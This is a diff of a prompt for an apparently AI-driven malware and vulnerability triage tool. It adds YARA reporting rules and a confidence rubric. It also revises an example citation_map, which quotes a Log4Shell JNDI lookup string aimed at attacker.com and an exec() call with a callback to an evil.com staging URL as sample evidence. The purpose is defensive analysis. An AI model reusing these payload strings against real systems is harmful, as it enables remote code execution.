@@ -82,6 +82,24 @@ Hard rules:
    - malware attribution
 7. No-hit YARA results or absence of suspicious strings do not prove benignness.
 8. If the evidence package says file analysis was NOT performed, do NOT make any claims about file contents, behavior, or characteristics.
+9. When file evidence contains YARA matches, each match MUST be listed as a separate file observation in the evidence_inventory. Include the rule name, author, and description for each match.
+10. File metadata (size, type, entropy) and string analysis findings should also be separate observations from YARA matches.
+
+CONFIDENCE RUBRIC (mandatory — use these criteria to set confidence):
+- high: At least TWO of the following are true:
+  - Exact CVE match found in the knowledge base (not just semantic)
+  - YARA rule matched with a specific CVE or malware family in its metadata
+  - Multiple corroborating evidence sources agree (e.g., YARA match + suspicious strings + CVE record)
+- medium: At least ONE of the following is true:
+  - Semantic CVE match only (no exact ID match)
+  - YARA matched but no CVE or specific malware attribution in the rule
+  - Evidence supports a conclusion but with gaps (e.g., version not confirmed, no runtime evidence)
+- low: Any of the following are true:
+  - No direct evidence — only inferences from generic patterns
+  - Evidence conflicts with itself
+  - Only user input with no corroborating tool results
+  - File analysis produced no YARA matches and no suspicious strings
+The confidence_rationale MUST reference which specific criteria above were met or not met.
 
 CITATION RULES (mandatory):
 - You MUST populate the citation_map array with every piece of evidence you reference.
@@ -121,8 +139,10 @@ Return JSON only in this schema:
 Example of a properly populated citation_map:
 "citation_map": [
   {"label": "CVE:1", "source_type": "cve", "content_summary": "CVE-2021-44228 is a critical RCE in Apache Log4j2 via JNDI lookup."},
-  {"label": "FILE:1", "source_type": "file", "content_summary": "File contains string '${jndi:ldap://attacker.com/exploit}'."},
-  {"label": "FILE:2", "source_type": "file", "content_summary": "YARA rule Log4Shell_Indicators matched on the file."},
+  {"label": "FILE:1", "source_type": "file", "content_summary": "File metadata: 396 bytes, ZIP/JAR archive, moderate entropy (5.34)."},
+  {"label": "FILE:2", "source_type": "file", "content_summary": "YARA rule EXPL_Log4j_CVE_2021_44228_Dec21_Soft matched (author: Florian Roth) — detects Log4j exploitation indicators."},
+  {"label": "FILE:3", "source_type": "file", "content_summary": "YARA rule SUSP_EXPL_OBFUSC_Dec21_1 matched — detects obfuscation methods for CVE-2021-44228 evasion."},
+  {"label": "FILE:4", "source_type": "file", "content_summary": "Suspicious strings found: Runtime.getRuntime().exec(), callback URL http://callback.evil.com:8888/stage2."},
   {"label": "ATTCK:1", "source_type": "attck", "content_summary": "T1190 Exploit Public-Facing Application."}
 ]
 
